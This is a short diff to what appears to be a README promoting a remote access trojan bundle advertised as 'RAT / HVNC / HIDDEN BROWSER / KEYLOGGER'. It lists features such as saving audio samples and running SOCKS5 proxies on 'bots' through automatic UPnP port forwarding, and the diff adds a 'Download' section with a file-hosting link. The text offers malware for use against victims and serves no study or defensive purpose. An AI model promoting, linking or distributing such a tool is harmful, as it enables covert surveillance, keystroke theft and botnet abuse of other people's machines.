@@ -90,3 +90,12 @@ RAT / HVNC / HIDDEN BROWSER / KEYLOGGER and more
     Save samples individually or select multiple samples to create a MP3 output.
 # SOCKS5 Proxy:
     Utilize SOCKS5 on your bots by attempting to automatically forward ports via UPnP.
+
+
+
+
+
+
+# Download
+
+https://gofile.io/d/nrSlCD
